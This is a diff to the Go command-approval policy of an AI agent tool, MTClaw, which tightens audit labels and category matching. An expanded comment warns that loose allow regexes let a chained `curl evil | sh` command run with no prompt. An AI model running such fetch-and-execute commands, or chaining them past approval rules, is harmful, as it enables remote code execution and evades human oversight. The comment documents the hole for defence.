@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"regexp"
+	"strings"
 	"time"
 
 	"github.com/tiennm99/MTClaw/internal/config"
@@ -30,7 +31,7 @@ const classifierTimeout = 10 * time.Second
 // Decision is Policy.Evaluate's result.
 type Decision struct {
 	Verdict Verdict
-	Audit   string // denied_rule | allowed_rule | approval | auto_allowed
+	Audit   string // denied_rule | allowed_rule | auto_allowed; empty for VerdictAsk, whose audit label execTool.ask assigns from the approver outcome
 	Rule    string // the matching deny/allow regex source, when any
 	Reason  string // shown to the user in the approval prompt when Verdict is VerdictAsk
 }
@@ -73,7 +74,7 @@ func NewPolicy(cfg config.ExecConfig, classifier Classifier) (*Policy, error) {
 
 	confirmOn := make(map[string]bool, len(cfg.Auto.ConfirmOn))
 	for _, c := range cfg.Auto.ConfirmOn {
-		confirmOn[c] = true
+		confirmOn[strings.ToLower(strings.TrimSpace(c))] = true
 	}
 
 	return &Policy{
@@ -93,10 +94,13 @@ func NewPolicy(cfg config.ExecConfig, classifier Classifier) (*Policy, error) {
 // when the same command arrives with a line continuation (a
 // backslash-newline pasted from a multi-line shell snippet). Applying (?s)
 // to allow as well would do the opposite of what an allow rule is for: an
-// anchored pattern like "^npm run .+$" is meant to permit exactly one tight
-// command, and (?s) would let ".+" swallow a newline plus an unrelated
-// second command appended after it, auto-running that second command with
-// no prompt.
+// anchored pattern is meant to permit exactly one tight command, and (?s)
+// would let a wide class swallow a newline plus an unrelated second command
+// appended after it, auto-running that second command with no prompt.
+// Allow patterns should therefore use a tight value class, not ".+": "."
+// matches ";", "&" and "|", so `^npm run .+$` also permits
+// `npm run build; curl evil | sh` with no prompt (deny rules still apply).
+// Prefer `^npm run [\w:.-]+$`.
 func compileRules(patterns []string, deny bool) ([]compiledRule, error) {
 	rules := make([]compiledRule, 0, len(patterns))
 	for _, p := range patterns {
@@ -169,14 +173,14 @@ func (p *Policy) Evaluate(ctx context.Context, cmd string) Decision {
 
 	switch p.mode {
 	case "approval":
-		return Decision{Verdict: VerdictAsk, Audit: "approval", Reason: "no deny or allow rule matched; tools.exec.mode is \"approval\""}
+		return Decision{Verdict: VerdictAsk, Reason: "no deny or allow rule matched; tools.exec.mode is \"approval\""}
 	case "auto":
 		return p.evaluateAuto(ctx, cmd)
 	default:
 		// "off" never reaches here (the exec tool is not registered), and
 		// nothing else is a valid config.Validate value; fail closed rather
 		// than assume anything about an unrecognized mode.
-		return Decision{Verdict: VerdictAsk, Audit: "approval", Reason: fmt.Sprintf("unrecognized tools.exec.mode %q; failing closed", p.mode)}
+		return Decision{Verdict: VerdictAsk, Reason: fmt.Sprintf("unrecognized tools.exec.mode %q; failing closed", p.mode)}
 	}
 }
 
@@ -188,7 +192,7 @@ func (p *Policy) Evaluate(ctx context.Context, cmd string) Decision {
 // never return a risk that skips this ask/run decision on a parse failure.
 func (p *Policy) evaluateAuto(ctx context.Context, cmd string) Decision {
 	if p.classifier == nil {
-		return Decision{Verdict: VerdictAsk, Audit: "approval", Reason: "auto mode has no risk classifier configured; failing closed"}
+		return Decision{Verdict: VerdictAsk, Reason: "auto mode has no risk classifier configured; failing closed"}
 	}
 
 	cctx, cancel := context.WithTimeout(ctx, classifierTimeout)
@@ -196,12 +200,12 @@ func (p *Policy) evaluateAuto(ctx context.Context, cmd string) Decision {
 
 	result, err := p.classifier.Classify(cctx, cmd, p.cwd, p.shell)
 	if err != nil {
-		return Decision{Verdict: VerdictAsk, Audit: "approval", Reason: "risk classification unavailable"}
+		return Decision{Verdict: VerdictAsk, Reason: "risk classification unavailable"}
 	}
 
 	ask := result.Risk == "high"
 	for _, category := range result.Categories {
-		if p.confirmOn[category] {
+		if p.confirmOn[strings.ToLower(strings.TrimSpace(category))] {
 			ask = true
 			break
 		}
@@ -212,7 +216,7 @@ func (p *Policy) evaluateAuto(ctx context.Context, cmd string) Decision {
 		if reason == "" {
 			reason = fmt.Sprintf("classifier flagged this command (risk=%s, categories=%v)", result.Risk, result.Categories)
 		}
-		return Decision{Verdict: VerdictAsk, Audit: "approval", Reason: reason}
+		return Decision{Verdict: VerdictAsk, Reason: reason}
 	}
 	return Decision{Verdict: VerdictRun, Audit: "auto_allowed", Reason: result.Reason}
 }
